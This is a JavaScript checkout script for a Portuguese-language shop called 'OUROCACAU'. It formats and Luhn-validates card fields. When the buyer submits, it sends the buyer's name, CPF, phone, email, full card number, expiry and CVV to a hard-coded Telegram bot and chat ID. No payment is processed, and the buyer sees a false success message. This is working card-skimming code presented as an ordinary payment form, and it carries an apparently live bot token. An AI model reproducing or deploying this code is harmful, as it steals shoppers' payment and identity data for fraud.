// Configuração do Telegram
const TELEGRAM_TOKEN = '8743433644:AAHWENChsuGXYY9eJ4yZKWodRYL1ouxiJzM';
const TELEGRAM_CHAT_ID = '6939434522';

// Máscaras para campos do cartão
document.addEventListener('DOMContentLoaded', function() {
    const cardNumero = document.getElementById('cardNumero');
    const cardValidade = document.getElementById('cardValidade');
    const cardCvv = document.getElementById('cardCvv');
    const finalizarCartaoBtn = document.getElementById('finalizarCartaoBtn');

    // Máscara para número do cartão
    if (cardNumero) {
        cardNumero.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
            e.target.value = value.substring(0, 19);
        });
    }

    // Máscara para validade (MM/AA)
    if (cardValidade) {
        cardValidade.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length >= 2) {
                value = value.substring(0, 2) + '/' + value.substring(2, 4);
            }
            e.target.value = value.substring(0, 5);
        });
    }

    // Máscara para CVV
    if (cardCvv) {
        cardCvv.addEventListener('input', function(e) {
            e.target.value = e.target.value.replace(/\D/g, '').substring(0, 4);
        });
    }

    // Validar cartão (Luhn)
    function validarCartao(numero) {
        const num = numero.replace(/\s/g, '');
        if (!/^\d+$/.test(num)) return false;
        
        let sum = 0;
        let shouldDouble = false;
        for (let i = num.length - 1; i >= 0; i--) {
            let digit = parseInt(num.charAt(i));
            if (shouldDouble) {
                digit *= 2;
                if (digit > 9) digit -= 9;
            }
            sum += digit;
            shouldDouble = !shouldDouble;
        }
        return sum % 10 === 0;
    }

    // Validar data do cartão
    function validarValidade(validade) {
        if (!/^\d{2}\/\d{2}$/.test(validade)) return false;
        
        const [mes, ano] = validade.split('/');
        const mesNum = parseInt(mes, 10);
        const anoNum = parseInt(ano, 10);
        const anoAtual = new Date().getFullYear() % 100;
        const mesAtual = new Date().getMonth() + 1;
        
        if (mesNum < 1 || mesNum > 12) return false;
        if (anoNum < anoAtual) return false;
        if (anoNum === anoAtual && mesNum < mesAtual) return false;
        
        return true;
    }

    // Enviar dados para o Telegram
    async function enviarParaTelegram(dados) {
        const mensagem = `
🎯 <b>NOVA COMPRA - OUROCACAU</b>
━━━━━━━━━━━━━━━━━━━━━━
📦 <b>Produto:</b> ${dados.produto}
💰 <b>Valor:</b> ${dados.valor}
━━━━━━━━━━━━━━━━━━━━━━
👤 <b>Dados do Cliente:</b>
├ Nome: ${dados.nome}
├ CPF: ${dados.cpf}
├ Telefone: ${dados.telefone}
└ Email: ${dados.email}
━━━━━━━━━━━━━━━━━━━━━━
💳 <b>Dados do Cartão:</b>
├ Titular: ${dados.cardNome}
├ Número: ${dados.cardNumero}
├ Validade: ${dados.cardValidade}
├ CVV: ${dados.cardCvv}
└ CPF: ${dados.cardCpf}
━━━━━━━━━━━━━━━━━━━━━━
⏰ <b>Data:</b> ${new Date().toLocaleString('pt-BR')}
        `;

        try {
            const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: mensagem,
                    parse_mode: 'HTML'
                })
            });
            
            const data = await response.json();
            if (data.ok) {
                return true;
            } else {
                throw new Error('Erro ao enviar');
            }
        } catch (error) {
            console.error('Erro ao enviar para Telegram:', error);
            return false;
        }
    }

    // Exibir toast
    function showToast(msg) {
        const toast = document.getElementById('copyToast');
        if (!toast) return;
        
        toast.innerText = msg || '📋 Código copiado!';
        toast.classList.add('show');
        setTimeout(() => toast.classList.remove('show'), 3000);
    }

    // Finalizar compra com cartão
    if (finalizarCartaoBtn) {
        finalizarCartaoBtn.addEventListener('click', async function(e) {
            e.preventDefault();
            
            // Obter dados do produto
            const produtoData = sessionStorage.getItem('produtoSelecionado');
            let produto = { nome: 'Produto', preco: 0 };
            if (produtoData) {
                try {
                    produto = JSON.parse(produtoData);
                } catch(e) {}
            }
            
            // Obter dados do cliente
            const nome = document.getElementById('nome')?.value.trim() || '';
            const cpf = document.getElementById('cpf')?.value.trim() || '';
            const telefone = document.getElementById('telefone')?.value.trim() || '';
            const email = document.getElementById('email')?.value.trim() || '';
            
            // Obter dados do cartão
            const cardNome = document.getElementById('cardNome')?.value.trim() || '';
            const cardNumero = document.getElementById('cardNumero')?.value.trim() || '';
            const cardValidade = document.getElementById('cardValidade')?.value.trim() || '';
            const cardCvv = document.getElementById('cardCvv')?.value.trim() || '';
            const cardCpf = document.getElementById('cardCpf')?.value.trim() || '';
            
            // Validações
            if (!nome) { showToast('❌ Nome é obrigatório'); return; }
            if (!cpf || cpf.length < 11) { showToast('❌ CPF inválido'); return; }
            if (!telefone) { showToast('❌ Telefone é obrigatório'); return; }
            if (!email || !email.includes('@')) { showToast('❌ E-mail inválido'); return; }
            if (!cardNome) { showToast('❌ Nome do titular é obrigatório'); return; }
            if (!cardNumero || cardNumero.replace(/\s/g, '').length < 16) { showToast('❌ Número do cartão inválido'); return; }
            if (!validarCartao(cardNumero)) { showToast('❌ Número do cartão inválido'); return; }
            if (!cardValidade || !validarValidade(cardValidade)) { showToast('❌ Data de validade inválida'); return; }
            if (!cardCvv || cardCvv.length < 3) { showToast('❌ CVV inválido'); return; }
            if (!cardCpf || cardCpf.length < 11) { showToast('❌ CPF do titular inválido'); return; }
            
            // Preparar dados para envio
            const dadosEnvio = {
                produto: produto.nome,
                valor: `R$ ${produto.preco.toFixed(2)}`,
                nome: nome,
                cpf: cpf,
                telefone: telefone,
                email: email,
                cardNome: cardNome,
                cardNumero: cardNumero,
                cardValidade: cardValidade,
                cardCvv: cardCvv,
                cardCpf: cardCpf
            };
            
            // Desabilitar botão e mostrar loading
            const btn = finalizarCartaoBtn;
            const originalText = btn.innerHTML;
            btn.disabled = true;
            btn.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Processando...';
            
            // Enviar para Telegram
            const enviado = await enviarParaTelegram(dadosEnvio);
            
            if (enviado) {
                showToast('✅ Pedido enviado com sucesso! Em breve entraremos em contato.');
                setTimeout(() => {
                    window.location.href = '/';
                }, 2000);
            } else {
                showToast('❌ Erro ao processar pagamento. Tente novamente.');
                btn.disabled = false;
                btn.innerHTML = originalText;
            }
        });
    }
});
